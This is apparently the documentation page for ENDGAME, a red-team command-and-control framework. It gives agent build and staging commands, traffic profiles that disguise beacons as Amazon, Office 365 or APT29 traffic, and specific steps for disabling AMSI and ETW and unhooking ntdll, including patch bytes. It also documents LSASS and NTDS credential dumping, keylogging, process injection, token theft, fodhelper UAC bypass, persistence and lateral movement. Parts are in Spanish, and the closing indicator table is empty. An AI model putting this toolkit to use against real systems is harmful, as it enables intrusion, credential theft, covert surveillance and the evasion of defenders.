ENDGAME C2 FRAMEWORK — v1.0
Red Team Infrastructure
github.com/endgamec2framework
Red Team C2 Framework

Operator-grade
command & control.
ENDGAME.

ENDGAME is a professional command and control framework built for authorized red team engagements, penetration testing, and educational security research. Designed to simulate realistic adversary techniques, assess detection coverage, and help security teams understand their defensive gaps — with built-in AI to accelerate campaign analysis and operator decision-making. Ideal for lab environments, security training, and hands-on learning.

Quick Start Task Reference GitHub
endgame — graph view · 8 agents · HTTP + SMB · kill chain · operator console
endgame — table view · 8 agents · HTTP & SMB · Active
Core Capabilities

Six capability pillars purpose-built for professional adversary simulation — from initial access to persistent, evasive post-exploitation.

⇆
Transport & Agent
  • HTTP · mTLS · SMB named pipe · TCP · DNS
  • Transport switchable at compile time
  • Ekko / Foliage sleep masking with XOR key
  • Per-agent jitter, kill date, working hours
  • Staged & reflective PE loading
◉
Evasion Engine
  • ETW blindness — kernel & process-level patch
  • AMSI bypass via VEH hardware breakpoint
  • NTDLL full unhook from clean disk copy
  • Hardware BP detection & forced clear
  • PEB spoofing · sandbox detection · timing checks
◆
Post-Exploitation
  • In-process BOF / COFF5 collections
  • LSASS dump · NTDS · SAM · LSA secrets
  • Token impersonation · UAC bypass (3 methods)
  • Clipboard · screenshot · keylogger
  • Remote process injection (shellcode & PE)
⊞
Operator & Team
  • Multi-operator web UI with RBAC roles
  • Shared real-time event log & team chat
  • Per-agent console with full command history
  • Kill chain graph — nodes, edges, transport labels
  • Internal pentest tab — SMB · WinRM · RDP · MSSQL · SSH
⬡
Infrastructure
  • Forward & reverse SOCKS5 + port forwarding
  • SMB pivot chains · HTTP relay · TCP tunnel
  • mTLS mutual auth with CA & cert rotation
  • Full REST API — all operations scriptable
  • Multi-profile listener management
✦
AI Capabilitiesnew
  • AI-assisted attack path planning & prioritization
  • Natural-language task generation from objectives
  • Automated campaign suggestion & triage
  • Credential context analysis & lateral move hints
  • Post-exploitation guidance based on agent state
Getting Started

Quick Start

Stand up a full Endgame C2 deployment in a single command. The install script handles dependencies, builds, certificates, and starts all services.

shell
sudo bash install.sh

Once the script completes, the operator GUI is available at http://127.0.0.1:8888. Then build and stage your Windows agent:

shell
# Build Windows agent (replace C2_HOST with your server IP)
make agent-exe C2_HOST=10.2.20.200 SLEEP=60 JITTER=20

# Stage over HTTP for delivery
python3 -m http.server 8081 --directory bin/
Note
The operator GUI token is auto-injected into window.__GUI_TOKEN__ on page load. If you see an "unauthorized" error, reload the page — do not copy the token from the URL bar.

Multi-agent deployment

Agents can chain through each other using different transports. A host without direct internet access can beacon through a compromised pivot using SMB named pipe or TCP, while others connect directly over HTTP or mTLS.

Installation

Installation

Clone the repository from GitHub, then run the install script on a Linux host with Go 1.21+ already installed — it handles system packages, modules, binaries, mTLS certificates, and starts all services as background daemons.

shell
git clone https://github.com/endgamec2framework/endgame
cd endgame
sudo bash install.sh

The script takes care of everything:

StepWhat happens
1. DependenciesInstalls mono-mcs, gcc-mingw-w64-x86-64, ncat via apt
2. Go modulesPulls go-sqlite3, uuid, go-donut, golang.org/x/sys
3. BuildCompiles server (bin/c2-server) and GUI client (bin/c2-client)
4. CertificatesGenerates CA + server mTLS certs in certs/
5. StartLaunches server and client as background daemons (PIDs in /tmp/)

What the script does NOT install

Go itself must already be installed. The Windows agent is built separately after installation — see Agents for build variables.

Managing the daemons

shell
# Stop all services
make stop

# Start again
make start

# Tail logs
tail -f /tmp/c2-server.log
tail -f /tmp/c2-client.log
PackagePurpose
mono-mcsMono C# compiler — required for some BOF utility scripts
gcc-mingw-w64-x86-64MinGW cross-compiler for CGO dependencies in the Windows agent build
ncatTCP utility for testing listeners and connectivity

Initialize Go modules

shell
make init
# Pulls: mattn/go-sqlite3, google/uuid, t-ash3x/go-donut, golang.org/x/sys

TLS certificates

The mTLS operator API (port 31337) requires a CA and server cert. The client GUI authenticates operator access using client certificates issued by this CA.

shell
make certs
# Creates: certs/ca.crt, certs/server.crt, certs/server.key
# Operator client certs issued via: POST /api/gencert

Building components

TargetOutputDescription
make serverbin/c2-serverC2 server (Linux, CGO off)
make clientbin/c2-clientOperator GUI client (Linux, CGO off)
make agent-exebin/agent.exeWindows agent (cross-compiled)
make agent-mtlsbin/agent-mtls.exeWindows agent with embedded mTLS certs
make agent-rawbin/agent.binRaw x64 shellcode via go-donut
make bofsbof/Clone 5 BOF collections from GitHub
make clean—Delete bin/, data/, certs/, uploads/

Daemon management

shell
make start      # start server + client as background daemons (nohup)
make stop       # stop daemons via PID files

# Logs:
tail -f /tmp/c2-server.log
tail -f /tmp/c2-client.log

In the Process List, the agent's own process is highlighted in amber. High-value targets like lsass.exe are marked in red for quick identification.

Architecture

Server Architecture

The Endgame server exposes four network services. Agents connect to the HTTP or mTLS listener; operators connect to the Operator API over mTLS or use the web GUI via the client process.

  • :8080HTTP listener — agent beacon traffic (cleartext, malleable profile)
  • :8443mTLS listener — agent beacon traffic over mutual TLS
  • :31337Operator API — authenticated REST API (mTLS client cert required)
  • :8888GUI port — operator web interface served by the client binary
Data persistence
All agent registrations, tasks, credentials, and results are stored in data/c2.db (SQLite). Uploads land in data/uploads/; downloads from agents in data/downloads/.

Agent Transports

The transport is selected at compile time. Multiple transports can be built as separate binaries and delivered depending on the target environment.

TransportBinaryPortNotes
HTTPagent.exe8080Default. Cleartext HTTP with malleable profile shaping. Suitable for most internal engagements.
mTLSagent-mtls.exe8443Mutual TLS with embedded client cert. Certificate pinning prevents interception.
SMB—445Named-pipe transport for lateral movement from an existing agent. No direct internet connectivity required.
TCP—anyRaw TCP socket. Useful for non-HTTP environments.
DNS—53DNS C2 channel. Slow but high-egress-filtering bypass.

Operator Roles

RoleCapabilities
viewerRead-only: view agents, tasks, results, credentials, uploads, reports
operatorAll viewer capabilities + submit tasks, build/deliver payloads, manage profiles, encode payloads, SOCKS control
adminAll operator capabilities + manage operator roles and certificates
Listeners

Listeners

Listeners receive incoming agent connections. The server starts the HTTP listener on port 8080 and the mTLS listener on port 8443 automatically on launch. Both can be reconfigured with server flags.

endgame — listener manager · 3 active listeners · HTTP :8080 · mTLS :8443 · DNS :53

HTTP Listener

endgame — listener manager · HTTP :8080 · mTLS :8443 · DNS :53 · all running

HTTP traffic shape is controlled by a malleable C2 profile. Profiles configure URI paths, HTTP headers, user-agent strings, and response bodies to blend beacon traffic with legitimate-looking HTTP requests.

Malleable Profiles

HTTP traffic is shaped by a malleable C2 profile. Profiles configure URI paths, HTTP headers, user-agent strings and response bodies to blend beacon traffic with legitimate-looking HTTP. Profiles are managed from the Payloads tab under the Malleable Profile panel.

Profile selector con dropdown, botones + Import y Browse. Los campos USER-AGENT, BEACON URIS, PROXY URL y EXTRA HEADERS son editables — pulsa Aplicar para aplicar al servidor.

Toast "Profile applied: amazon" tras seleccionar el perfil Amazon y pulsar Aplicar. El beacon tráfico imita navegación Amazon con Host: www.amazon.com y URIs realistas.

El diálogo Import Malleable Profile acepta nombre y texto raw del .profile (formato Cobalt Strike). Los perfiles de BC-SECURITY/Malleable-C2-Profiles son compatibles.

shell
# List profiles via API
GET /api/profiles

# Create or update a profile
POST /api/profiles
POST /api/profiles/{name}

mTLS Listener

The mTLS listener requires that the agent binary have the CA certificate embedded at build time (make agent-mtls). The agent presents its client certificate on each connection; the server validates it against the embedded CA.

endgame — payload builder · OPSEC avanzado · Garble · Sandbox checks · Sleep Mask XOR

SMB Named Pipe

The SMB transport uses Windows named pipes for agent-to-agent pivoting. An existing agent starts a pipe server (PIPE_START task), and a second agent on the same network connects to it as its transport. No direct internet connectivity is needed from the inner host.

shell
# On the pivot agent — start named pipe server
PIPE_START \\.\pipe\svcctl

# Second agent built with SMB transport connects through the pivot
Traffic Shaping

Malleable C2 Profiles

Un malleable C2 profile controla cada byte del tráfico HTTP del beacon — rutas URI, cabeceras HTTP, user-agent, cuerpos de respuesta y transforms de encoding. El resultado es tráfico del agente indistinguible de una aplicación legítima específica a nivel de red. ENDGAME usa el formato .profile de Cobalt Strike y es compatible con la librería BC-SECURITY/Malleable-C2-Profiles.

Cómo funciona
Cuando se aplica un perfil, el servidor C2 inyecta los headers, URIs y user-agent configurados en cada respuesta HTTP y espera exactamente esa forma en cada beacon request. El agente se compila con este contrato integrado — cualquier desviación se descarta silenciosamente, dificultando significativamente el análisis de tráfico.

Panel Malleable Profile en Payloads. Selector de perfil, botones + Import y Browse. Campos editables: USER-AGENT, BEACON URIS, PROXY URL, EXTRA HEADERS. Pulsa Aplicar para activarlo.

Toast "Profile applied: amazon" tras seleccionar y aplicar. Los campos se rellenan automáticamente y el servidor adopta esa forma de tráfico de inmediato.

Diálogo de importación: nombre del perfil + texto raw del .profile (formato Cobalt Strike). Acepta cualquier perfil de BC-SECURITY y perfiles personalizados.

Formato del Perfil

Los perfiles siguen la sintaxis Malleable C2 de Cobalt Strike. ENDGAME parsea el bloque http-get: directivas set useragent, set uri y header.

profile
# jquery-c2.3.3.profile
set useragent "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)";
set sleeptime "5000";
set jitter    "10";

http-get {
    set uri "/jquery-3.3.1.slim.min.js";
    client {
        header "Accept"           "text/javascript, application/javascript";
        header "Host"             "code.jquery.com";
        metadata { base64url; prepend "SESSION="; header "Cookie"; }
    }
    server {
        header "Content-Type"   "application/javascript";
        header "Cache-Control"  "max-age=2592000";
        output { print; }
    }
}

Librería de Perfiles

Perfiles compatibles de BC-SECURITY/Malleable-C2-Profiles. Descarga el .profile y usa el diálogo Import para cargarlo en ENDGAME.

amazon BUNDLED
→ Amazon Shopping
Low
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0)

Bundled por defecto. URIs imitan búsquedas Amazon, headers Host: www.amazon.com. Ideal para entornos corporativos con acceso a internet estándar.

↗ GitHub⬇ Raw
jquery
→ jQuery CDN
Low
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1)

Imita peticiones a CDN jQuery. Muy efectivo en entornos web; casi nunca genera alertas en proxies corporativos.

↗ GitHub⬇ Raw
office365
→ Office 365 / Teams
Low
Mozilla/5.0 (Windows NT 10.0; Win64; x64)

Tráfico disfrazado como llamadas API de O365. Perfecto en entornos Microsoft 365 donde este tráfico es constante y whitelisted.

↗ GitHub⬇ Raw
slack
→ Slack API
Low
Mozilla/5.0 (Windows NT 10.0; Win64; x64)

Imita la API REST de Slack. Extremadamente eficaz en empresas tech donde Slack es herramienta estándar.

↗ GitHub⬇ Raw
ocsp
→ OCSP Cert Check
Med

Imita tráfico OCSP (Online Certificate Status Protocol). Raramente inspeccionado por sensores de red y cortafuegos.

↗ GitHub⬇ Raw
pandora
→ Pandora Radio
Low
Mozilla/5.0 (Windows NT 6.1; WOW64)

Beacon disfrazado como streaming de audio Pandora. Efectivo en entornos que permiten streaming de medios.

↗ GitHub⬇ Raw
microsoftupdate
→ Windows Update BITS
Med
Windows-Update-Agent/10.0.10011.16384

Imita tráfico BITS de Windows Update. Normalmente en whitelist de cortafuegos enterprise por defecto.

↗ GitHub⬇ Raw
safebrowsing
→ Google Safe Browsing
Low
Mozilla/5.0 (Windows NT 6.1)

Imita consultas de Google Safe Browsing API. Extremadamente común en logs de proxy empresarial.

↗ GitHub⬇ Raw
havex
→ HAVEX / ICS
High
Mozilla/4.0 (compatible; MSIE 7.0)

Réplica del C2 del malware HAVEX de Energetic Bear. Para red teams en entornos ICS/SCADA.

↗ GitHub⬇ Raw
apt29
→ APT29 / Cozy Bear
High
Mozilla/5.0 (Windows NT 6.3; Trident/7.0)

Imita los patrones de C2 de APT29. Para ejercicios de emulación de adversarios de nivel nation-state.

↗ GitHub⬇ Raw

Instalación via API

bash
# Importar perfil directamente via REST API
PROFILE=$(curl -s https://raw.githubusercontent.com/BC-SECURITY/Malleable-C2-Profiles/master/Normal/jquery-c2.3.3.profile)
curl -sk -X POST https://127.0.0.1:31337/api/profiles \
  --cert operator.crt --key operator.key \
  -H "Content-Type: application/json" \
  -d '{"name":"jquery","source":"https://...","raw_text":"'"$PROFILE"'"}'
Agents

The Ekko Agent

Ekko is the primary Windows agent, cross-compiled from Go. It supports multiple sleep-masking strategies, configurable evasion patches at startup, and runtime-selectable AMSI bypass methods. All capabilities are baked into the binary at compile time and controlled via build flags.

Build Variables

VariableDefaultDescription
C2_HOST127.0.0.1Callback IP or hostname for the agent
SLEEP60Initial beacon sleep interval in seconds
JITTER20Sleep jitter as a percentage (e.g. 20 = ±20%)
EVASIONtrueApply startup evasion patches (ETW, AMSI, ntdll unhook)
SLEEP_MASKekkoSleep masking strategy: ekko (XOR), noaccess (PAGE_NOACCESS)
AMSI_METHODvehAMSI bypass: veh (hardware BP, zero-byte patch) or patch (byte overwrite)
KILL_DATE—Optional kill date — agent self-terminates after this date
endgame — payload builder · all compile-time options · OPSEC avanzado · Garble · Sandbox checks · Transport selection
endgame — payload builder · Transport: HTTP · Garble · Sandbox detect · Win EXE / DLL / Raw

Sleep Masking

During beacon sleep intervals, the agent applies a sleep mask to make its memory regions unreadable or unrecognizable to EDR memory scanners.

Ekko (XOR mask)

Before sleeping: XOR-scrambles all registered heap buffers and shellcode regions (RX→RW, XOR with key 0xA7, back to RX). Sleeps via NtDelayExecution (bypasses kernel32!Sleep hooks). After waking: unmasks all regions.

NoAccess (PAGE_NOACCESS)

Sets shellcode regions to PAGE_NOACCESS before sleeping. Any EDR read attempt against those pages generates an access violation. Restores original protections on wake.

Memory Scrambler Daemon

An additional defense for long-sleeping agents — the MEM_FLUCTUATE task starts a background goroutine that XOR-scrambles registered buffers on a configurable interval, defeating periodic EDR memory scanners.

task
# Start memory scrambler — scramble every 15 seconds
MEM_FLUCTUATE start 15

# Stop
MEM_FLUCTUATE stop

Converting to Shellcode

shell
# Convert agent.exe to PIC shellcode via go-donut
make agent-raw
# Output: bin/agent.bin
Warning
The raw agent EXE (agent.exe) is a PE file, not shellcode. Do not use it directly as an injection payload. Always use bin/agent.bin (shellcode) for INJECT_REMOTE, INJECT_APC, or FORK_RUN tasks.
Post-Exploitation

Post-Exploitation

Code Injection

TaskArgs / PayloadDescription
INJECT_REMOTE"<pid>" + shellcode payloadClassic remote process injection into target PID via VirtualAllocEx / WriteProcessMemory / CreateRemoteThread
INJECT_APCoptional process path + shellcode payloadEarly-bird APC injection. Spawns a sacrificial process and queues shellcode before its main thread runs. Returns async after 10s.
THREAD_HIJACK"<pid>" + shellcode payloadSuspend a thread in target PID, overwrite RIP via SetThreadContext, resume
FORK_RUNoptional process path + shellcode payloadFork a sacrificial process and inject shellcode into it. Parent agent survives.
STAGE2shellcode payload (no args)Inject shellcode into the current agent process via a goroutine
example
# Inject Cobalt Strike beacon (shellcode) into explorer.exe PID 1234
# Task: INJECT_REMOTE
# Args: "1234"
# Payload: <base64-encoded shellcode>

# APC injection into a new svchost.exe process
# Task: INJECT_APC
# Args: "C:\\Windows\\System32\\svchost.exe"
# Payload: <base64-encoded shellcode>

Token Manipulation

Endgame provides a full token store — steal tokens from multiple processes and switch between them at runtime without re-exploiting.

TaskArgsDescription
STEAL_TOKEN"<pid>"Steal and impersonate primary token from target PID (OpenProcess + DuplicateTokenEx + ImpersonateLoggedOnUser)
TOKEN_MAKE"DOMAIN\user password"Create a logon token from known credentials via LogonUser
TOKEN_WHOAMI—Display current impersonated identity
TOKEN_DROP—Revert to original agent token
TOKEN_STORE_STEAL"<pid>"Steal token from PID and save to numbered store
TOKEN_STORE_SHOW—List all tokens in store with index and username
TOKEN_STORE_USE"<id>"Activate token at store index
TOKEN_STORE_REMOVE"<id>"Remove token from store
TOKEN_STORE_CLEAR—Clear all stored tokens

Credential Harvesting

LSASS Minidump

endgame — operator console · PS · lsass.exe [!] · sqlservr.exe [*] on SQLSVR-02
Warning
LSASS dumps are large (typically 150–250MB). Uploading over the C2 channel consumes significant memory in the agent. Avoid combining MINIDUMP with other memory-intensive tasks in the same batch.

NTDS Dump

task
# Dump ntds.dit + SYSTEM hive via ntdsutil IFM
NTDS_DUMP C:\Windows\Temp\ifm_out
# Retrieve with: DOWNLOAD + impacket-secretsdump

Clipboard

task
CLIP_GET  # Read current clipboard contents

Keylogger & Screenshot

TaskDescription
KEYLOG_STARTStart keylogger (hook-based, captures all keystrokes)
KEYLOG_STOPStop keylogger
KEYLOG_DUMPRetrieve captured keystrokes
SCREENSHOTTake a single screenshot, upload to server
SCREENWATCH_STARTPeriodic screenshot capture (default: every 30s). Args: optional interval in seconds
SCREENWATCH_STOPStop screenwatch daemon
Lateral Movement

Lateral Movement

SOCKS5 & Pivoting

TaskArgsDescription
SOCKS_START"<port> [user:pass]"Start a SOCKS5 proxy on the agent. Optional credential authentication.
SOCKS_STOP—Stop SOCKS5 proxy
RSOCKS_START"<callback_port>"Establish a reverse SOCKS5 tunnel back to the C2 server
RSOCKS_STOP—Tear down reverse SOCKS5 tunnel
HTTP_PIVOT_STARToptional port (default 8888)Start an HTTP reverse-proxy pivot on the agent
HTTP_PIVOT_STOP—Stop HTTP pivot
PIPE_STARTpipe name (default \\.\pipe\svcctl)Start an SMB named-pipe pivot server
PIPE_STOP—Stop SMB pipe server
example
# Start SOCKS5 proxy on agent port 1080
SOCKS_START 1080

# Use with proxychains to pivot through the agent
proxychains nmap -sT -p 445,3389,5985 10.2.20.0/24

# Reverse SOCKS — agent connects back, useful through NAT
RSOCKS_START 1080

Port Forwarding

task
# Forward local port 3389 → 10.2.20.50:3389
PORTFWD_ADD tcp 3389 10.2.20.50 3389

# List active rules
PORTFWD_LIST

# Remove
PORTFWD_DEL tcp 3389

WinRM Lateral Movement

endgame — internal pentest · credential verification · SMB · WinRM · RDP · MSSQL · SSH

Network Discovery

endgame — network scanner · host discovery · port scan · ARP sweep
Internal Operations

Internal Pentest

Endgame integrates lateral movement delivery and Living-off-the-Land (LOLBin) staging directly through the GUI for use during internal assessments.

endgame — network scanner · host discovery · TCP/ARP sweep · subnet reachability

Credential-Based Execution

With captured credentials or NT hashes, Endgame can deliver payloads to remote hosts using several execution methods without touching disk.

MethodToolNotes
wmiexecnetexec / impacketWMI execution — no service creation, semi-interactive
atexecnetexec / impacketAT task scheduler — creates a transient scheduled task
smbexecnetexec / impacketSMB-based execution — creates and deletes a service
psexecnetexec / impacketClassic PsExec-style — noisier, writes binary to ADMIN$
WinRMnetexec / WINRM_EXECPowerShell remoting — requires WinRM service enabled
endgame — internal pentest · credential verification · SMB / WinRM / RDP / MSSQL / SSH

Once credentials are captured, the Internal Pentest tab lets you verify access across protocols and immediately deliver a new agent to the target host.

endgame — internal pentest · TARGET: 10.10.0.1 (DC-CORP-01) · SMB / WinRM / RDP / MSSQL / SSH verify · ⚡ Upload+Exec → agent deployed
Workflow
  1. Enter the target IP, domain, username, password or NT hash.
  2. Click SMB or WinRM to verify credential access — a green banner confirms Pwn3d!.
  3. Select the staged payload from the Payload dropdown, set the remote path and staging URL.
  4. Click ⚡ Upload+Exec — the agent binary is copied via SMB and executed via WMI. A new agent beacon appears in the Agents view within the configured sleep window.

LOLBin Payload Delivery

endgame — stager builder · Delivery · LNK / ISO / HTA / PS1 · tunnels: Cloudflare · Serveo · ngrok

UAC Bypass

task
# Bypass UAC using fodhelper (default)
ELEVATE fodhelper cmd.exe /c whoami > C:\Windows\Temp\out.txt

# Alternative methods
ELEVATE computerdefaults "cmd.exe /c ..."
ELEVATE cmlua "cmd.exe /c ..."

Persistence

task
# Add scheduled task persistence
PERSIST_TASK endgame_updater

# Remove
PERSIST_RM endgame_updater
Advanced

Evasion & OPSEC

When EVASION=true (default), the agent applies a sequence of startup patches before the first beacon. These execute synchronously in main() before any network activity.

#TechniqueMethodEDR Impact
1ETW BlindOverwrite ntdll!EtwEventWrite with xor rax,rax; retDisables all process ETW telemetry
2ETW Process DisableNtSetInformationProcess(ProcessEnableReadWriteVmLogging=0)No byte modification — invisible to memory scanners
3AMSI BypassVEH hardware BP on AmsiScanBuffer (default) or byte patchAll AMSI scans return clean without modifying amsi.dll
4ntdll UnhookLoad clean ntdll from disk, compare + restore modified prologuesRemoves all EDR user-mode hooks on NT syscalls
endgame — OPSEC builder · Kill Date · Working Hours · AMSI VEH · PPID Spoof · Sleep Mask XOR · Guardrails

AMSI Bypass Detail

VEH Method (default — AMSI_METHOD=veh)

Zero-byte modification. A hardware breakpoint is planted on DR0 pointing to AmsiScanBuffer. A Vectored Exception Handler catches the resulting EXCEPTION_SINGLE_STEP and sets RAX=1 (AMSI_RESULT_CLEAN), then clears DR7. No amsi.dll bytes are modified — memory integrity scans see no changes.

Patch Method (AMSI_METHOD=patch)

Overwrites the first 6 bytes of AmsiScanBuffer with B8 57 00 07 80 C3 (mov eax, E_INVALIDARG; ret). Effective but visible to memory scanners that compare in-memory function prologues against clean copies.

endgame — operator console · hook_check · 14 NT prologues scanned · 0 EDR hooks detected

ETW & ntdll Unhooking

The ntdll unhook process loads a fresh copy of ntdll.dll from disk with DONT_RESOLVE_DLL_REFERENCES (DllMain not called). It compares each exported function's prologue against the in-memory version. Any function with a JMP, CALL, or INT3 trampoline has its prologue restored from the clean copy, removing EDR kernel-driver hooks.

Functions checked by HOOK_CHECK: NtOpenProcess, NtAllocateVirtualMemory, NtWriteVirtualMemory, NtProtectVirtualMemory, NtCreateThreadEx, NtQueueApcThread, NtMapViewOfSection, LdrLoadDll, EtwEventWrite, CreateRemoteThread, VirtualAllocEx, WriteProcessMemory, OpenProcess, AmsiScanBuffer.

Anti-Sandbox & Anti-Debug

CheckTechnique
Debugger detectionNtQueryInformationProcess(ProcessDebugPort=7) — kernel returns -1 when debugger attached
Timing sandbox detectionMeasure a 1ms Sleep — if elapsed >500ms, time acceleration detected → sandbox
Hardware BP checkRead DR0–DR3 via GetThreadContext(CONTEXT_DEBUG_REGISTERS)

EDR Silencing

endgame — OPSEC avanzado · Kill Date · Working Hours · AMSI Bypass: VEH · PPID Spoof · Sleep Mask: XOR
Advanced

BOF / COFF Execution

Endgame includes an in-process COFF/BOF loader. BOFs run inside the agent process without spawning a sacrificial process, which reduces injection noise and preserves the current token context.

Supported Argument Types

TypeDescription
zString (null-terminated)
ZWide string (UTF-16)
iInteger (32-bit)
sShort (16-bit)
bBinary blob (raw bytes)
BBase64-decoded binary blob

BOF Store

Load BOFs into the agent's in-memory store to avoid re-uploading on every execution.

task
# Load a BOF into memory store
# Task: BOF_STORE_LOAD
# Args: "whoami"
# Payload: <base64-encoded COFF bytes>

# List stored BOFs
BOF_STORE_LIST

# Execute a BOF from the store
# Task: BOF
# Args: "whoami"

# Unload
BOF_STORE_UNLOAD whoami

Preloaded BOF Collections

Run make bofs to clone these collections into bof/:

CollectionAuthorContents
BofAllTheThingsCommunityAggregated BOF collection covering recon, priv-esc, and lateral movement
CS-Situational-Awareness-BOFTrustedSecHost, network, and AD situational awareness without touching disk
nanodumpFortraLSASS dump via various techniques — fork, snapshot, handle duplication
C2-Tool-CollectionOutflankRecon, defense evasion, and execution BOFs for red team engagements
BOFsajpc500Supplementary BOF collection with additional post-exploitation capabilities
Reference

Task Reference

Complete list of all task types accepted by the agent. Tasks are submitted via the GUI or REST API as {"type": "TASK_NAME", "args": "...", "payload": "<base64>"}.

Core

TaskArgsDescription
shellcommand stringExecute a shell command (60s timeout)
sleep{"sec":N,"jitter":N}Update beacon sleep interval and jitter
sysinfo—Return hostname, user, OS version, PID
getpid—Return agent PID
ppid—Return agent parent PID
kill—Immediately terminate the agent (os.Exit)
cleanup—Self-delete and exit

Filesystem

TaskArgsDescription
pwd—Print working directory
cdpathChange directory (empty = home)
lspathHuman-readable directory listing
ls_jsonpathJSON directory listing
catfile pathRead and return file contents
mkdirpathCreate directory (recursive)
rmpathDelete file or directory (recursive)
env—Dump all environment variables
download{"path":"..."}Upload file from agent to C2 server
upload{"filename":"...","remote_path":"..."}Push file from server to agent

Process

TaskArgsDescription
ps—Human-readable process list
ps_json—JSON process list
evasion_status—Report current evasion config and AMSI method

Evasion

TaskArgsDescription
hook_check—Scan 14 key function prologues for EDR hooks
hw_bp_check—Check DR0–DR3 for hardware breakpoints
hwbp_clear—Clear hardware breakpoints on current thread
mem_fluctuate"start [interval]" / "stop"Toggle periodic memory scrambler daemon
edr_silence—Add WFP rule to silence EDR telemetry
edr_silence_rm—Remove EDR-silencing WFP rule
eventlog_suspend—Suspend Windows Event Log service thread
eventlog_resume—Resume Windows Event Log service thread
peb_spoofprocess nameMasquerade PEB as target process name

Injection

TaskArgs / PayloadDescription
stage2payload: shellcodeSelf-inject shellcode in current process
inject_remote"<pid>" + payloadRemote process injection via classic VirtualAllocEx chain
inject_apcoptional path + payloadEarly-bird APC injection in sacrificial process
thread_hijack"<pid>" + payloadThread context hijack via SetThreadContext / RIP overwrite
fork_runoptional path + payloadFork sacrificial process, inject, run

Token

TaskArgsDescription
steal_token"<pid>"Steal + impersonate token from process
token_make"DOMAIN\user pass"Create logon token from credentials
token_drop—Revert to original token
token_whoami—Show current identity
token_store_steal"<pid>"Steal + save to token store
token_store_show—List token store
token_store_use"<id>"Activate stored token
token_store_remove"<id>"Remove token from store
token_store_clear—Clear all stored tokens

Persistence & Privilege

TaskArgsDescription
persist_tasktask nameScheduled task persistence
persist_rmtask nameRemove persistence
elevate"fodhelper|computerdefaults|cmlua <cmd>"UAC bypass via one of three methods

Credentials & Recon

TaskArgsDescription
minidumpoptional PIDLSASS minidump — auto-locates if no PID given
ntds_dumpoutput dirntdsutil IFM dump of ntds.dit + SYSTEM hive
clip_get—Read clipboard
port_scan"<target> [ports] [timeout_ms]"Port scan or host discovery (CIDR, range)

Pivoting & Network

TaskArgsDescription
socks_start"<port> [user:pass]"SOCKS5 proxy on agent
socks_stop—Stop SOCKS5
rsocks_start"<port>"Reverse SOCKS5 tunnel to C2
rsocks_stop—Tear down reverse SOCKS5
portfwd_add"[tcp|udp] <lport> <rhost> <rport>"Add port-forward rule
portfwd_del"[tcp|udp] <lport>"Remove port-forward rule
portfwd_list—List active port-forward rules
http_pivot_startoptional portHTTP reverse-proxy pivot
http_pivot_stop—Stop HTTP pivot
pipe_startpipe nameSMB named-pipe pivot server
pipe_stop—Stop pipe server
winrm_execJSON objectExecute command on remote host via WinRM
winrm_deployJSON objectDeploy payload on remote host via WinRM

Surveillance

TaskDescription
KEYLOG_START / KEYLOG_STOP / KEYLOG_DUMPHook-based keylogger
screenshotSingle screenshot, uploaded to server
SCREENWATCH_START / SCREENWATCH_STOPPeriodic screenshot capture daemon

Interactive Shell

TaskArgsDescription
ishell_open"cmd" / "ps" / emptyOpen persistent interactive shell session
ishell_runcommandSend command to open shell
ishell_close—Close interactive shell

BOF

TaskArgs / PayloadDescription
bofargs string + payload: COFF bytesExecute COFF/BOF in-process
bof_list—Show supported argument types
bof_store_load"<name>" + payload: COFF bytesLoad BOF into in-memory store
bof_store_list—List stored BOFs
bof_store_unload"<name>"Unload BOF from store
Reference

API Reference

The operator REST API runs on port 31337 with mTLS client certificate authentication. All responses are JSON with the structure {"ok": true, "data": ...}.

Authentication

endgame — operator panel · role management · event log · operator configuration

Viewer Routes (read-only)

MethodRouteDescription
GET/api/agentsList all registered agents
GET/api/agents/{id}Agent detail + task results. Query: ?limit=N, ?taskid=X
GET/api/jobsList pending/queued jobs
GET/api/jobs/{id}Get or manage a specific job
GET/api/credsList stored credentials
GET/api/creds/{id}Credential detail / action
GET/api/uploadsList uploaded files
GET/api/dl/{file}Download a file from server
GET/api/eventsSSE event stream
GET/api/reportGenerate engagement report
GET/api/attack-layerMITRE ATT&CK Navigator layer
GET/api/operatorsList connected operators
GET/api/chatTeam chat
GET/api/pingHeartbeat / keepalive
GET/api/netinfoNetwork topology / pivot info
GET/api/artifactsList stored artifacts
GET/api/pubipAgent public IP lookup

Operator Routes

MethodRouteDescription
POST/api/buildBuild agent on-demand
POST/api/deliverStage and deliver payload
POST/api/donutConvert PE to shellcode via go-donut
POST/api/encodeEncode/obfuscate payload. Params: ?type=<enc>&file=<name>
POST/api/gencertGenerate new operator mTLS certificate
POST/api/rsocksControl reverse SOCKS5 from server side
GET/POST/api/stagerStaging file server + URL generation
GET/POST/api/profilesManage C2 profiles
GET/POST/api/profiles/{name}Get/update a specific profile
GET/POST/api/artifacts/{id}Upload or manage artifact

Admin Routes

MethodRouteDescription
GET/POST/api/rolesManage operator roles

Task Submission Example

shell
curl -s -X POST http://localhost:8888/api/agents/<agent-id>/task \
  -H "X-GUI-Token: <token>" \
  -H "Content-Type: application/json" \
  -d '{"type":"SHELL","args":"whoami /all"}'
python
import urllib.request, json, html.parser

# Auto-fetch GUI token
class TokenParser(html.parser.HTMLParser):
    token = None
    def handle_script(self, data):
        if '__GUI_TOKEN__' in data:
            import re
            m = re.search(r"__GUI_TOKEN__\s*=\s*['\"]([^'\"]+)", data)
            if m: self.token = m.group(1)

page = urllib.request.urlopen('http://127.0.0.1:8888/').read().decode()
p = TokenParser(); p.feed(page)
TOKEN = p.token

# Submit a task
def task(agent_id, t, args=''):
    body = json.dumps({'type': t, 'args': args}).encode()
    req = urllib.request.Request(
        f'http://127.0.0.1:8888/api/agents/{agent_id}/task',
        data=body, method='POST',
        headers={'X-GUI-Token': TOKEN, 'Content-Type': 'application/json'}
    )
    return json.loads(urllib.request.urlopen(req).read())
Threat Intelligence

Indicators of Compromise

All artifacts, network signatures, memory patches, and behavioral patterns generated by ENDGAME C2. Import these into your SIEM, EDR, and threat intelligence platform to detect unauthorized deployment in your environment. Hashes correspond to the default-compiled binaries included in this distribution.

Blue Team Note
These IOCs are published as part of responsible red team tool documentation. Any production deployment should regenerate all certificates, recompile agents with custom build flags, and rotate all default values. If you encounter these exact artifacts in your environment without a sanctioned engagement, treat it as a potential intrusion.

Memory Signatures

TechniqueTargetPatch / PatternDetection
